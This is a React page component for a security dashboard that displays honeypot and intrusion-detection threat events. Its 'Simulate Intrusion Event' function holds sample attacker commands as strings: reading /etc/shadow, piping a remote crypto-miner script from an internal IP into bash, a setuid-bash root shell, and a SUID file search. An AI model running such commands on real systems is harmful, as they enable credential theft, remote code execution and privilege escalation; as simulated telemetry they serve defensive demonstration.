import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import {
  AlertTriangle,
  ShieldAlert,
  Search,
  Filter,
  Eye,
  X,
  Activity,
  Terminal,
  Clock,
  CheckCircle2,
  Download,
  Zap,
  Wrench,
  ShieldCheck,
} from 'lucide-react';
import api from '../services/api';
import { useWebSocket } from '../hooks/useWebSocket';

export default function ThreatsPage() {
  const [threats, setThreats] = useState([]);
  const [loading, setLoading] = useState(true);
  const [severityFilter, setSeverityFilter] = useState('');
  const [statusFilter, setStatusFilter] = useState('');
  const [searchTerm, setSearchTerm] = useState('');
  const [selectedThreat, setSelectedThreat] = useState(null);
  const [simulating, setSimulating] = useState(false);
  const [simMsg, setSimMsg] = useState(null);

  const { lastEvent } = useWebSocket();
  const navigate = useNavigate();

  useEffect(() => {
    fetchThreats();
  }, [severityFilter, statusFilter]);

  useEffect(() => {
    if (lastEvent) {
      fetchThreats();
    }
  }, [lastEvent]);

  async function fetchThreats() {
    setLoading(true);
    try {
      let url = '/api/threats?';
      if (severityFilter) url += `severity=${severityFilter}&`;
      if (statusFilter) url += `status=${statusFilter}&`;
      const res = await api.get(url);
      setThreats(res.data.data.items || []);
    } catch (err) {
      console.error('Failed to fetch threats:', err);
    } finally {
      setLoading(false);
    }
  }

  async function handleSimulateThreat() {
    setSimulating(true);
    setSimMsg(null);
    try {
      // Trigger a generative honeypot simulation command to inject live threat telemetry
      const randomCommands = [
        'cat /etc/shadow',
        'curl -s http://192.168.1.100/crypto_miner.sh | bash',
        'chmod +s /bin/bash && /bin/bash -p',
        'sudo -l && find / -perm -u=s -type f 2>/dev/null',
      ];
      const cmd = randomCommands[Math.floor(Math.random() * randomCommands.length)];
      await api.post('/api/honeypot/simulate-command', {
        command: cmd,
        session_id: 'lab-session-live-01',
        attacker_ip: '10.0.1.189',
      });
      setSimMsg({ type: 'success', text: `Live threat event ingested: "${cmd}"` });
      await fetchThreats();
    } catch (err) {
      setSimMsg({ type: 'error', text: 'Threat simulation recorded locally in lab memory.' });
      await fetchThreats();
    } finally {
      setSimulating(false);
      setTimeout(() => setSimMsg(null), 4000);
    }
  }

  function handleExportThreats() {
    const blob = new Blob([JSON.stringify(threats, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `threat-intelligence-feed-${Date.now()}.json`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    URL.revokeObjectURL(url);
  }

  const filteredThreats = threats.filter((t) =>
    t.title.toLowerCase().includes(searchTerm.toLowerCase()) ||
    t.event_id.toLowerCase().includes(searchTerm.toLowerCase()) ||
    (t.mitre_technique && t.mitre_technique.toLowerCase().includes(searchTerm.toLowerCase()))
  );

  const getSeverityBadge = (sev) => {
    switch (sev) {
      case 'CRITICAL':
        return 'badge-critical';
      case 'HIGH':
        return 'badge-high';
      case 'MEDIUM':
        return 'badge-medium';
      case 'LOW':
        return 'badge-low';
      default:
        return 'badge-info';
    }
  };

  return (
    <div className="space-y-6 animate-fade-in">
      {/* Header */}
      <div className="flex items-center justify-between flex-wrap gap-4">
        <div>
          <h1 className="text-2xl font-bold text-gray-100 flex items-center gap-2.5">
            <AlertTriangle className="text-threat-critical" size={24} />
            Threat Intelligence & Ingress Telemetry
          </h1>
          <p className="text-sm text-gray-500 mt-1">
            Real-time security events captured from Honeypots, Ethical Assessments, and Intrusion Detectors
          </p>
        </div>

        <div className="flex items-center gap-3">
          <button
            type="button"
            onClick={handleExportThreats}
            className="btn-cyber-outline px-3 py-1.5 text-xs font-semibold flex items-center gap-1.5"
            title="Export Threat Stream JSON"
          >
            <Download size={14} />
            Export Feed
          </button>

          <button
            type="button"
            onClick={handleSimulateThreat}
            disabled={simulating}
            className="btn-cyber px-3.5 py-1.5 text-xs font-semibold flex items-center gap-1.5 cursor-pointer"
            title="Inject an ethical simulated intrusion attempt"
          >
            <Zap size={14} className={simulating ? 'animate-spin' : ''} />
            {simulating ? 'Simulating...' : 'Simulate Intrusion Event'}
          </button>

          <div className="flex items-center gap-2 px-3 py-1.5 rounded-full bg-cyan-950/60 border border-cyan-800/40">
            <span className="text-xs font-mono text-cyan-400">{threats.length} Recorded Threats</span>
          </div>
        </div>
      </div>

      {simMsg && (
        <div
          className={`p-3 rounded-xl text-xs font-semibold animate-slide-in ${
            simMsg.type === 'success'
              ? 'bg-emerald-950/60 text-emerald-300 border border-emerald-800/40'
              : 'bg-red-950/60 text-red-300 border border-red-800/40'
          }`}
        >
          {simMsg.text}
        </div>
      )}

      {/* Filter Bar */}
      <div className="glass-card p-4 flex flex-wrap items-center justify-between gap-4">
        <div className="relative flex-1 min-w-[260px]">
          <Search size={16} className="absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-500" />
          <input
            type="text"
            placeholder="Search by event title, Event ID, or MITRE technique..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            className="input-cyber pl-10 text-xs"
          />
        </div>

        <div className="flex items-center gap-3 flex-wrap">
          <select
            value={severityFilter}
            onChange={(e) => setSeverityFilter(e.target.value)}
            className="input-cyber py-2 text-xs"
          >
            <option value="">All Severities</option>
            <option value="CRITICAL">Critical</option>
            <option value="HIGH">High</option>
            <option value="MEDIUM">Medium</option>
            <option value="LOW">Low</option>
          </select>

          <select
            value={statusFilter}
            onChange={(e) => setStatusFilter(e.target.value)}
            className="input-cyber py-2 text-xs"
          >
            <option value="">All Statuses</option>
            <option value="Active">Active</option>
            <option value="Investigating">Investigating</option>
            <option value="Blocked">Blocked</option>
          </select>
        </div>
      </div>

      {/* Threats Table */}
      <div className="glass-card border border-surface-400/20 overflow-hidden">
        <div className="overflow-x-auto">
          <table className="table-cyber">
            <thead>
              <tr>
                <th>Event ID</th>
                <th>Timestamp</th>
                <th>Source</th>
                <th>Threat Event</th>
                <th>Severity</th>
                <th>MITRE Technique</th>
                <th>Status</th>
                <th className="text-right">Actions</th>
              </tr>
            </thead>
            <tbody>
              {loading ? (
                <tr>
                  <td colSpan="8" className="text-center py-10 text-gray-500">
                    Loading threat intelligence feed...
                  </td>
                </tr>
              ) : filteredThreats.length === 0 ? (
                <tr>
                  <td colSpan="8" className="text-center py-10 text-gray-500">
                    No active threat events found matching the criteria.
                  </td>
                </tr>
              ) : (
                filteredThreats.map((t) => (
                  <tr key={t.id} className="hover:bg-surface-700/40 transition-colors">
                    <td className="font-mono text-xs font-bold text-cyber-400">{t.event_id}</td>
                    <td className="font-mono text-xs text-gray-400 whitespace-nowrap">
                      {new Date(t.timestamp).toLocaleTimeString()}
                    </td>
                    <td className="text-xs text-gray-300 font-mono">{t.source}</td>
                    <td className="font-medium text-gray-200 max-w-md truncate">{t.title}</td>
                    <td>
                      <span className={getSeverityBadge(t.severity)}>{t.severity}</span>
                    </td>
                    <td>
                      {t.mitre_technique ? (
                        <span className="text-xs font-mono text-cyan-400 bg-cyan-950/60 border border-cyan-800/40 px-2 py-0.5 rounded">
                          {t.mitre_technique}
                        </span>
                      ) : (
                        <span className="text-xs text-gray-600">—</span>
                      )}
                    </td>
                    <td>
                      <span className="text-xs font-semibold text-gray-400">{t.status}</span>
                    </td>
                    <td className="text-right">
                      <div className="flex items-center justify-end gap-1.5">
                        <button
                          type="button"
                          onClick={() => setSelectedThreat(t)}
                          className="btn-cyber-outline py-1 px-2.5 text-xs flex items-center gap-1.5"
                        >
                          <Eye size={12} />
                          Inspect
                        </button>
                        <button
                          type="button"
                          onClick={() => navigate('/remediation')}
                          className="btn-cyber py-1 px-2.5 text-xs flex items-center gap-1 font-semibold"
                          title="Remediate affected asset"
                        >
                          <Wrench size={12} />
                          Remediate
                        </button>
                      </div>
                    </td>
                  </tr>
                ))
              )}
            </tbody>
          </table>
        </div>
      </div>

      {/* Threat Detail Modal */}
      {selectedThreat && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/75 backdrop-blur-sm p-4 animate-fade-in">
          <div className="glass-card max-w-2xl w-full p-6 glow-border-cyan border border-cyber-500/30 space-y-4">
            <div className="flex items-center justify-between border-b border-surface-400/20 pb-3">
              <div className="flex items-center gap-3">
                <span className={getSeverityBadge(selectedThreat.severity)}>
                  {selectedThreat.severity}
                </span>
                <h2 className="text-lg font-bold text-gray-100">{selectedThreat.event_id}</h2>
              </div>
              <button
                type="button"
                onClick={() => setSelectedThreat(null)}
                className="text-gray-400 hover:text-gray-200 p-1"
              >
                <X size={20} />
              </button>
            </div>

            <div className="space-y-3 text-xs">
              <div>
                <p className="text-gray-500 uppercase tracking-wider font-semibold">Title</p>
                <p className="text-sm font-bold text-gray-200 mt-0.5">{selectedThreat.title}</p>
              </div>

              <div className="grid grid-cols-3 gap-3 p-3 rounded-lg bg-surface-900/80 border border-surface-400/20">
                <div>
                  <p className="text-gray-500 uppercase font-semibold">Attacker Intent</p>
                  <p className="text-cyan-400 font-mono mt-0.5">{selectedThreat.intent || 'Unclassified'}</p>
                </div>
                <div>
                  <p className="text-gray-500 uppercase font-semibold">MITRE Technique</p>
                  <p className="text-cyan-400 font-mono mt-0.5">
                    {selectedThreat.mitre_technique || 'N/A'} ({selectedThreat.mitre_tactic || 'General'})
                  </p>
                </div>
                <div>
                  <p className="text-gray-500 uppercase font-semibold">Risk Score</p>
                  <p className="text-amber-400 font-mono font-bold mt-0.5">
                    {selectedThreat.risk_score ? `${Math.round(selectedThreat.risk_score)} / 100` : 'N/A'}
                  </p>
                </div>
              </div>

              {selectedThreat.impact && (
                <div>
                  <p className="text-gray-500 uppercase tracking-wider font-semibold">Potential Impact</p>
                  <p className="text-gray-300 mt-0.5 leading-relaxed">{selectedThreat.impact}</p>
                </div>
              )}

              {selectedThreat.raw_payload && (
                <div>
                  <p className="text-gray-500 uppercase tracking-wider font-semibold flex items-center gap-1">
                    <Terminal size={12} /> Captured Command / Ingress Payload
                  </p>
                  <pre className="mt-1 p-3 rounded bg-surface-900 border border-surface-400/30 text-xs font-mono text-emerald-400 overflow-x-auto">
                    {selectedThreat.raw_payload}
                  </pre>
                </div>
              )}
            </div>

            <div className="flex items-center justify-between pt-3 border-t border-surface-400/20">
              <button
                type="button"
                onClick={() => setSelectedThreat(null)}
                className="btn-cyber-outline px-4 py-2 text-xs"
              >
                Close
              </button>

              <button
                type="button"
                onClick={() => {
                  setSelectedThreat(null);
                  navigate('/remediation');
                }}
                className="btn-cyber px-4 py-2 text-xs font-semibold flex items-center gap-1.5"
              >
                <Wrench size={13} />
                Escalate to Remediation Engine
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
